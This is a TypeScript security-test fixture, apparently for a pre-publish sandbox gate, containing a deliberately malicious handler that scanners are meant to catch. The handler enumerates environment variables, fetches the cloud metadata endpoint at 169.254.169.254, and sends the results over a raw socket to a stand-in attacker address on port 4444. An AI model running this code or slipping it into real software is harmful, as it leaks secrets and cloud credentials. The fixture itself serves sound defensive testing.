// MALICIOUS DoD FIXTURE (SBX-06) — SOURCE-ONLY, NEVER EXECUTED HERE.
//
// This is the deliberately-adversarial sample endpoint that the Phase 3
// pre-publish gate must catch (RESEARCH Pattern 6 / Pitfall: the fixture is
// source-only; the static scans read its SOURCE TEXT, they never import or run
// it). It exercises all THREE attack vectors so the scans have a positive target:
//
//   1. process.env enumeration   -> the secret/env scan must FLAG it (SBX-06a)
//   2. fetch 169.254.169.254     -> the dynamic blocked-host probe must BLOCK it
//                                    (SBX-02/06c, operator-gated on the gVisor host)
//   3. net.connect (raw socket)  -> the dangerous-import deny-list must FLAG the
//                                    `net` import (SBX-06b)
//
// !!! DO NOT IMPORT OR EXECUTE THIS MODULE FROM A TEST !!!
// The ONLY place this is ever run live is the operator-gated gVisor dynamic
// probe on the provisioned isolation host (Plan 06). Running it on plain
// Docker / Docker Desktop is NOT a security boundary and would actually attempt
// the SSRF/exfil. Tests assert on its SOURCE STRING, never on its behavior.

import net from "net";

/**
 * The adversarial handler. If this ever ran outside the gVisor sandbox it would
 * attempt to exfiltrate platform env, hit the cloud metadata endpoint, and open
 * an arbitrary outbound socket. The pre-publish gate exists to ensure it NEVER
 * reaches deployment.
 */
export async function maliciousHandler(): Promise<Response> {
  // 1. Read + enumerate platform environment (secret/env-scan target).
  const leakedEnv = Object.keys(process.env);

  // 2. Reach the cloud metadata service (SSRF target the egress firewall blocks).
  let metadata = "";
  try {
    const res = await fetch("http://169.254.169.254/latest/meta-data/");
    metadata = await res.text();
  } catch {
    metadata = "blocked";
  }

  // 3. Open an arbitrary outbound socket (raw-socket / dangerous-import target).
  const socket = net.connect({ host: "203.0.113.10", port: 4444 });
  socket.on("connect", () => {
    socket.write(JSON.stringify({ env: leakedEnv, metadata }));
    socket.end();
  });
  socket.on("error", () => socket.destroy());

  return new Response(JSON.stringify({ leaked: leakedEnv.length, metadata }), {
    headers: { "content-type": "application/json" },
  });
}
